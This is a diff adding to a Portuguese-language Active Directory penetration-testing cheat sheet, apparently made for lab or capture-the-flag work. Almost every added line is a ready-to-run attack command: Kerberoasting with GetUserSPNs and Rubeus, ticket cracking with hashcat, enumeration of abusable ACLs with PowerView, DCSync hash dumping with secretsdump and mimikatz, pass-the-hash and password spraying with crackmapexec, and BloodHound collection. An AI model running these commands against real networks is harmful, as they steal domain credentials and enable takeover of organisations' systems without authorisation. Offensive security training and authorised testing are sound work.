@@ -662,3 +662,94 @@ mimikatz # kerberos::list /export
 python2.7 kirbi2john.py sqldev.kirbi
 sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
 
+hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
+
+# Coletando SPNs via Kali
+
+GetUserSPNs.py -dc-ip <SERVER IP> DOMAIN.COM/<USERNAME>
+GetUserSPNs.py -dc-ip <SERVER IP> DOMAIN.COM/<USERNAME> -request
+GetUserSPNs.py -dc-ip <SERVER IP> DOMAIN.COM/<USERNAME> -request-user sqldev
+GetUserSPNs.py -dc-ip <SERVER IP> DOMAIN.COM/<USERNAME> -request-user sqldev -outputfile sqldev_tgs
+
+# Coletando SPNs com Rubeus, nesse caso contas com $krb5tgs$23$* são validas e é possível crackear, em contrapartida, contas com $krb5tgs$18$* são bem dificeis de crackear e não vale a pena perder tempo.
+# Comando para verificar o tipo de hash
+
+Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
+
+.\Rubeus.exe kerberoast /user:testspn /nowrap
+
+# Para forçar o AD a passar tickets RC4 podemos utilizar a flag tgtdeleg
+
+.\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap
+
+# Para crackear SPNs RC4-HASH
+
+hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
+
+# Para crackear SPNs AES-256 (tipo 18)
+
+hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
+
+# Explorando ACLs
+# Enumerando ACLs de usuários com PowerView
+
+https://learn.microsoft.com/en-us/windows/win32/adschema/r-user-force-change-password
+
+Import-Module .\PowerView.ps1
+$sid = Convert-NameToSid <name>
+Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+
+# Fazendo reverse search e mapeando o GUID manualmente
+
+$guid= "XXXXXXXXX-XXXXXX-XXXXX-XXXXX-XXXXXXXXXXXXXXXXXXX"
+Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
+
+# Podemos também utilizar a flag ResolveGUIDs
+
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+
+# Criando uma lista de usuários do dominio
+
+Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
+
+# No comando abaixo fazemos um loop para procurar os usuários no arquivo ad_users
+
+foreach($line in [System.IO.File]::ReadLines("C:\path-to-file\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'DOMAIN.COM\\USERNAME'}}
+
+# DCSync
+# Para realizar DCSync é necessário ter um usuário com essas permissões.
+
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -outputfile inlanefreight_hashes -hashes 00000000000000000000000000000000:<NTLM-HASH> -just-dc DOMAIN.COM/USERNAME@DOMAIN.COM
+
+# Mesma ideia com mimikatz
+
+lsadump::dcsync /domain:<DOMAIN.COM> /user:<USERNAME> /ntlm:<NTLM-HASH>
+
+# Ataques via kali
+
+sudo python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip <SERVER IP> DOMAIN.COM/USERNAME -request
+
+crackmapexec smb -u "<USERNAME>" -p "<PASSWORD>" -d <DOMAIN> <NET RANGE>
+
+crackmapexec smb -u "<USERNAME>" -H <NTLM-HASH> -d <DOMAIN> <SERVER IP> -x 'type c:\path-to-file\flag.txt'
+
+crackmapexec smb -u <USERNAME> -p creds.txt --no-bruteforce --continue-on-succes <SERVER-IP>
+
+# BLOODHOUND
+
+./bloodhound.py -c All -u [username] -p [password] -dc [domain controller domain name] -d [domain name] -ns [nameserver ip]
+
+# Bloodhound Linux
+
+sudo python3 /opt/BloodHound.py/bloodhound.py -u <user> -p 'password' -ns 10.1.1.1 -d domain.local -c all
+
+https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/
+
+# Bloodhound Windows
+
+Import-Module .\Sharphound.ps1
+Invoke-Bloodhound -CollectionMethod All -Domain domain.local -ZipFileName loot.zip
+
+# Queries customizadas
+
+https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/
